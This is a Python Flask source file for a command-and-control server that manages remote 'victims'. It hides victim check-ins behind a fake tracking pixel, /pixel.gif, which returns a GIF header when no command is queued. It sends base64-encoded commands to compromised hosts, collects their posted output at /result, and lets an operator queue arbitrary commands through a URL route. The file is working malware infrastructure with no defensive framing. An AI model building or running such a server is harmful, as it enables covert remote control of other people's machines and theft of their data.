from flask import Flask, request, jsonify
import subprocess, base64

app = Flask(__name__)

COMMANDS = {}  # victim_id → command queue
RESULTS  = {}

@app.route('/pixel.gif')
def beacon():
    vid = request.args.get('id', 'unknown')
    print(f"[T1] Beacon from {vid} | IP: {request.remote_addr}")
    
    cmd = COMMANDS.pop(vid, None)
    if cmd:
        return jsonify({"cmd": base64.b64encode(cmd.encode()).decode()})
    return b'\x47\x49\x46\x38\x39\x61', 200, {'Content-Type': 'image/gif'}

@app.route('/result', methods=['POST'])
def result():
    data = request.json
    vid = data.get('id')
    out = base64.b64decode(data.get('output', '')).decode()
    RESULTS[vid] = out
    print(f"[T1] Result from {vid}:\n{out}")
    return 'OK'

@app.route('/cmd/<vid>/<path:cmd>')
def set_cmd(vid, cmd):
    COMMANDS[vid] = cmd
    return f'Queued: {cmd}'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
                                          
